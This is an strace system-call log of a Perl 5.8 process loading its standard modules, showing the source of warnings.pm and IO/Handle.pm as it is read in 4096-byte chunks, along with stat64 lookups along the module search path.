%Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
11891 07:39:45.158141 brk(0x81b6000)    = 0x81b6000
11891 07:39:45.158158 brk(0x81b5000)    = 0x81b5000
11891 07:39:45.158236 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
11891 07:39:45.158731 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
11891 07:39:45.159403 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
11891 07:39:45.159535 read(8, "", 4096) = 0
11891 07:39:45.159557 close(8)          = 0
11891 07:39:45.159716 _llseek(6, 412, [412], SEEK_SET) = 0
11891 07:39:45.159732 _llseek(6, 0, [412], SEEK_CUR) = 0
11891 07:39:45.159743 close(6)          = 0
11891 07:39:45.159784 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11891 07:39:45.159808 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11891 07:39:45.159836 futex(0xb7f77070, 0x81 /* FUTEX_??? */, 2147483647) = 0
11891 07:39:45.159853 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
11891 07:39:45.159867 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11891 07:39:45.159956 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11891 07:39:45.159982 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f7b000
11891 07:39:45.159996 mmap2(0xb7f7f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f7f000
11891 07:39:45.160011 close(6)          = 0
11891 07:39:45.160154 stat64("/etc/perl/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160176 stat64("/etc/perl/IO/Handle.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160190 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160203 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160217 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160230 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160244 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160256 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160269 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160281 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160294 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.160307 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
11891 07:39:45.160328 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.160343 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.160355 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.160371 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
11891 07:39:45.161044 stat64("/etc/perl/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170370 stat64("/etc/perl/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170370 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.170371 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
